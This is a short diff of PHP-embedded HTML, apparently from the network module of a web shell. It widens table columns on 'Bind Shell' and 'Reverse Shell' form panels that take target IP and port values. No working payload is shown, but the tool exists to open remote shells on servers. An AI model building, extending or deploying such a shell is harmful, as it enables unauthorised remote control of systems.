@@ -22,12 +22,12 @@ $GLOBALS['module']['network']['content'] = "
 	<tr><th colspan='2'><p class='boxtitle'>Bind Shell</p></th></tr>
 </thead>
 <tbody>
-	<tr><td style='width:120px'>Server IP</td><td><input type='text' id='bindAddr' value='".$server_addr."' disabled></td></tr>
+	<tr><td style='width:144px'>Server IP</td><td><input type='text' id='bindAddr' value='".$server_addr."' disabled></td></tr>
 	<tr><td>Port</td><td><input type='text' id='bindPort' value='".$default_port."' onkeydown=\"trap_enter(event, 'rs_go_bind');\"></td></tr>
 </tbody>
 <tfoot>
 	<tr>
-		<td style='width:120px;'>
+		<td style='width:144px;'>
 			<select id='bindLang' class='rsType'>
 				".$winbinary."
 			</select>
@@ -43,12 +43,12 @@ $GLOBALS['module']['network']['content'] = "
 	<tr><th colspan='2'><p class='boxtitle'>Reverse Shell</p></th></tr>
 </thead>
 <tbody>
-	<tr><td style='width:120px'>Target IP</td><td><input type='text' id='backAddr' value='".$remote_addr."' onkeydown=\"trap_enter(event, 'rs_go_back');\"></td></tr>
+	<tr><td style='width:144px'>Target IP</td><td><input type='text' id='backAddr' value='".$remote_addr."' onkeydown=\"trap_enter(event, 'rs_go_back');\"></td></tr>
 	<tr><td>Port</td><td><input type='text' id='backPort' value='".$default_port."' onkeydown=\"trap_enter(event, 'rs_go_back');\"></td></tr>
 </tbody>
 <tfoot>
 	<tr>
-		<td style='width:120px;'>
+		<td style='width:144px;'>
 			<select id='backLang' class='rsType'>
 				".$winbinary."
 			</select>
